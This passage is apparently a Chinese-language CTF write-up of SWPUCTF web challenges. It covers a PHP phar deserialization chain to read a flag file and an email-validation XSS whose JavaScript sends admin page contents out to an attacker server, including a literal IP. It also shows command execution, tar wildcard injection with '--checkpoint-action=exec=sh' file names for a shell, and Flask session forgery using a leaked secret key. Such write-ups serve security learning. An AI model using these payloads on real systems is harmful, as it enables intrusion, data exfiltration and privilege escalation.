        public $file;
        public $params;
        public function __construct()
        {
            $this->params = array();
        }
        public function __get($key)
        {
            return $this->get($key);
        }
        public function get($key)
        {
            if(isset($this->params[$key])) {
                $value = $this->params[$key];
            } else {
                $value = "index.php";
            }
            return $this->file_get($value);
        }
        public function file_get($value)
        {
            $text = base64_encode(file_get_contents($value));
            return $text;
        }
    }
    ?>
_show方法把f1agWAF掉了所以我们不能直接去读flag。
但是Test类的get方法能够获取一个参数做为文件名，然后调用file_get方法返回文件内容的base64值。而且__get魔术方法调用了get方法。我们可以想办法触发__get魔术方法。
Show类的__toString魔术方法调用了未知对象的source属性，而对象str[‘str’]我们可控，因此我们可以传入Test对象去调用不存在的source属性来触发__get方法。
而C1e4r类的__destruct()方法可以用来触发Show类的__toString方法
最终的exp
    params = [
        'source' => '/var/www/html/f1ag.php'
    ];
    $b = new Show();
    $b->str['str'] = $a;
    $c = new C1e4r();
    $c->str = $b;
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("");
    $phar->setMetadata($c); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
    copy('phar.phar','exp.gif');
    ?>
上传的最终文件路径为upload/md5(文件名+ip).jpg
触发反序列化
flag：SWPUCTF{Php_un$eri4liz3_1s_Fu^!}
###  有趣的邮箱注册
访问admin.php会显示只有localhost才能访问，估计是要用xss来进行ssrf。
源码中发现check.php部分代码
可以看到利用了FILTER_VALIDATE_EMAIL过滤器来过滤注册的邮箱，是不安全的。
可以参考p神师傅的文章：
邮箱地址分为local part和domain part两部分，local
part中可以利用双引号来包含特殊字符。如””[@example](https://github.com/example
"@example").com是合法的
所以我们可以构造””[@qq](https://github.com/qq
"@qq").com进行xss。但是发现打到的cookie为空，所以只能利用ajax来读取后台页面。
    xmlhttp=new XMLHttpRequest();
    xmlhttp.onreadystatechange=function()
    {
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            document.location='http://yourvps/?'+btoa(xmlhttp.responseText);
        }
    }
    xmlhttp.open("POST","admin.php",true);
    xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    xmlhttp.send();
在自己的vps上监听端口，即可收到请求。
可以发现admin.php中有一个admin/a0a.php?cmd=whoami，明显的命令执行。但是一直弹不回来shell，不知道为什么，只好用ajax把命令执行的结果反弹回来。
构造
    xmlhttp=new XMLHttpRequest();
    xmlhttp.onreadystatechange=function()
    {
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            document.location='http://47.106.142.99:8012/?'+btoa(xmlhttp.responseText);
        }
    }
    xmlhttp.open("POST","a0a.php?cmd=ls /",true);
    xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    xmlhttp.send();
但是读取flag会发现返回为空，执行ls -al /发现flag文件属于flag用户，且其他用户无法读取。
通过ls我们发现了一个MD5名字的目录，ls一下发现有upload.php，并且属于flag用户。
访问页面，给了一个上传功能，一个备份功能。发现可以任意文件上传，上传php但是不可访问。备份点开可以发现是使用tar命令就行备份。
shadow爷爷告诉我这里可以利用tar命令进行提权。参考：[利用通配符进行Linux本地提权](https://www.freebuf.com/articles/system/176255.html)
其实就是把文件名当作命令参数给执行了。
将反弹shell的命令写入shell.sh，并上传。再接着上传两个文件–checkpoint-action=exec=sh
shell.sh和–checkpoint=1，然后点击备份即可反弹shell。但是一直不能成功，按理说是没问题的，问了题目客服，他也说没问题。这就很迷了23333。
最后把shell.sh内容改成
    cat /flag|base64
可以直接读取flag。
###  皇家线上赌场
登陆查看源码可以看到提示以及/static?file=test.js弹出的xss，访问一下source可以看到一个目录树和views.py中的任意文件读取。
但是限制了..，我们只能用绝对路径去读取源码。
通过读取/proc/self/mounts可以看到一个/home/ctf/web_assli3fasdf路径，但是里面读取不到views.py的内容。
shadow爷爷告诉我/proc/self/cwd/app/views.py可以读
    def register_views(app):
        @app.before_request
        def reset_account():
            if request.path == '/signup' or request.path == '/login':
                return
            uname = username=session.get('username')
            u = User.query.filter_by(username=uname).first()
            if u:
                g.u = u
                g.flag = 'swpuctf{xxxxxxxxxxxxxx}'
                if uname == 'admin':
                    return
                now = int(time())
                if (now - u.ts >= 600):
                    u.balance = 10000
                    u.count = 0
                    u.ts = now
                    u.save()
                    session['balance'] = 10000
                    session['count'] = 0
        @app.route('/getflag', methods=('POST',))
        @login_required
        def getflag():
            u = getattr(g, 'u')
            if not u or u.balance < 1000000:
                return '{"s": -1, "msg": "error"}'
            field = request.form.get('field', 'username')
            mhash = hashlib.sha256(('swpu++{0.' + field + '}').encode('utf-8')).hexdigest()
            jdata = '{{"{0}":' + '"{1.' + field + '}", "hash": "{2}"}}'
            return jdata.format(field, g.u, mhash)
还有一个__init__.py
    from flask import Flask
    from flask_sqlalchemy import SQLAlchemy
    from .views import register_views
    from .models import db
    def create_app():
        app = Flask(__name__, static_folder='')
        app.secret_key = '9f516783b42730b7888008dd5c15fe66'
        app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////tmp/test.db'
        register_views(app)
        db.init_app(app)
        return app
可以看到给了secret_key，可以用来伪造session。
解密题目session
本地搭建环境使用secret_key伪造session，并把用户名改为admin来跳过balance的重置，访问getflag路由。
然后使用User的save方法跳出g.u获取flag。
## 后记
web题质量都挺不错的，把我打自闭了，出题和运维的师傅们辛苦了，orz~。